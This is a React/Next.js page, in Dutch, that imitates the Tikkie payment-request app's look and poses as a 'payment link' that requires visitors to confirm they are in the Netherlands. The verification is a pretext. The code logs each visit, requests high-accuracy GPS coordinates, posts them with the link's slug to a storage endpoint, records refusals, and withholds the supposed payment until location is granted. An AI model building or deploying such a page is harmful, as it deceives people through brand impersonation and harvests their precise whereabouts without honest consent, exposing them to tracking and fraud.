import { useEffect, useState } from 'react';

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [error, setError] = useState(null);

  const log = async (data) => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  };

  // Log direct dat bezoeker hier is
  useEffect(() => {
    log({
      slug,
      flow: 'verify',
      event: 'visit',
    });
  }, []);

  const requestLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await log({
          slug,
          flow: 'verify',
          event: 'allowed',
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });

        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        await log({
          slug,
          flow: 'verify',
          event: 'denied',
          denied: true,
        });

        setError('Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.');
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  return (
    <div style={styles.page}>
      <div style={styles.circle}>
        <img
          src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
          alt="IJsje"
          style={styles.image}
        />
      </div>

      <h1 style={styles.title}>
        🇳🇱 Bevestig dat je uit Nederland komt
      </h1>

      <p style={styles.subtitle}>
        Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
      </p>

      <button onClick={requestLocation} style={styles.button}>
        Bevestigen met locatie
      </button>

      {error && <p style={styles.error}>{error}</p>}
    </div>
  );
}

/* 🎨 STYLES — mobile first, Tikkie-achtig */
const styles = {
  page: {
    minHeight: '100vh',
    backgroundColor: '#4A4B7C', // exact Tikkie-achtig paars
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    textAlign: 'center',
    padding: '1.5rem',
    fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
  },

  circle: {
    width: '176px',   // 20% kleiner dan 220
    height: '176px',
    borderRadius: '50%',
    backgroundColor: '#FFFFFF',
    border: '8px solid #3E3F66',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    overflow: 'hidden',
    marginBottom: '1.5rem',
  },

  image: {
    width: '100%',
    height: '100%',
    objectFit: 'cover',
  },

  title: {
    color: '#FFFFFF',
    fontSize: '1.75rem',
    fontWeight: 700,
    marginBottom: '0.75rem',
  },

  subtitle: {
    color: '#D8D9F0',
    fontSize: '1rem',
    maxWidth: '360px',
    marginBottom: '1.5rem',
  },

  button: {
    backgroundColor: '#FFFFFF',
    color: '#4A4B7C',
    border: 'none',
    borderRadius: '10px',
    padding: '0.9rem 1.4rem',
    fontSize: '1rem',
    fontWeight: 600,
    cursor: 'pointer',
    width: '100%',
    maxWidth: '320px',
  },

  error: {
    marginTop: '1rem',
    color: '#FFD6D6',
    fontSize: '0.9rem',
  },
};
